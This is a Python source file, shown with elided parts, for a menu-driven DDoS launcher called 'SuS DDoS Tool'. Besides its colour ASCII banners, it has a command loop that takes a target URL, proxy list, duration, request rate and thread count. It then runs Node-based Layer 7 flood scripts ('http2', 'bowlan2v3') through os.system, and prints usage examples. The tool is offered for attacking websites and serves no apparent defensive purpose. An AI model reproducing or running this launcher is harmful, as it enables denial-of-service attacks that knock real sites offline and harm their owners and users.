...
def si():
    print('\x1b[38;2;233;233;233mWelcome to SuS DDoS Tool\x1b[38;2;233;233;233mBy SuSTeam')
    print("")
...
def title():
    ...
    clear()
    print('\x1b[38;2;233;233;233mWelcome to SUSDDOS by SuSTeam \x1b[38;2;233;233;233m')
    clear()
    print('\x1b[38;2;233;233;233mWelcome to SUSDDOS by SuSTeam\x1b[38;2;233;233;233m')
    print(f'''
               ...
               \x1b[38;2;0;255;255m╚═════╝░░╚═════╝░╚═════╝░╚══\x1b[38;2;255;20;147m═══╝░╚═════╝░░╚════╝░╚═════╝░
                ...
                \x1b[38;2;0;255;255m╚═══════════════╦═════════\x1b[38;2;0;255;255m═\x1b[38;2;255;20;147m═════════╦═══════════════╝
            \x1b[38;2;0;255;255m╔═══════════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════════╗
            \x1b[38;2;0;255;255m  - - - \x1b[38;2;0;255;255m[ Dev: ĐNDK   x   Duy\x1b[38;2;225;20;147mKhuong \x1b[38;2;225;20;147m  x   DK ] - - -
            \x1b[38;2;0;255;255m╚═══════════════════╦══════════\x1b[38;2;255;20;147m═════════╦═══════════════════╝
                \x1b[38;2;0;255;255m╔═══════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════╗
                \x1b[38;2;0;255;255m                 \x1b[38;2;0;255;255mPowered by\x1b[38;2;255;20;147m SUS DDoS Team
...
def methods():
    ...
    print(f'''      
           ...
           \x1b[38;2;0;255;255m╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░\x1b[38;2;255;20;147m░╚═╝░╚════╝░╚═════╝░╚═════╝░        
            ...
            \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhttp2       \x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mempty            \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mempty       \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mempty  \x1b[38;2;255;20;147m║  
            \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mbowlan2v3   \x1b[38;2;0;255;255m|  \x1b[38;2;0;255;255mempty            \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mempty       \x1b[38;2;255;20;147m|  \x1b[38;2;255;20;147mempty  \x1b[38;2;255;20;147m║  
            \x1b[38;2;0;255;255m╚═══════════════════╦══════════\x1b[38;2;255;20;147m═════════╦═══════════════════╝
                \x1b[38;2;0;255;255m╔═══════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════╗
''')
##############################################################################################
...
def main():
    title()
    while(True):
        cnc = input('''\x1b[38;2;0;255;255m[SuSDDoS@\x1b[38;2;255;20;147mDuyKhuong]:''')
...
# LAYER 7 METHODS
            ...
            try:
                ...
                rate = cnc.split()[5]
                threads = cnc.split()[6]
                os.system(f'node http2 {mode} {url} {proxy} {time} {rate} {threads}')
            except IndexError:
                print('Usage: http2 <GET/POST> <url> <proxy> <time> <rate> <threads>')
                print('Example: http2 GET https://example.com proxy.txt 60 1000 10')
            
        elif "bowlan2v3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                mode = cnc.split()[4]
                os.system(f'node bowlan2v3 {url} {time} {threads} {mode}')
            except IndexError:
                print('Usage: bowlan2v3 <url> <time> <threads> <proxy/off/proxy.txt>')
                print('Example: bowlan2v3 https://example 60 10 proxy2.txt')
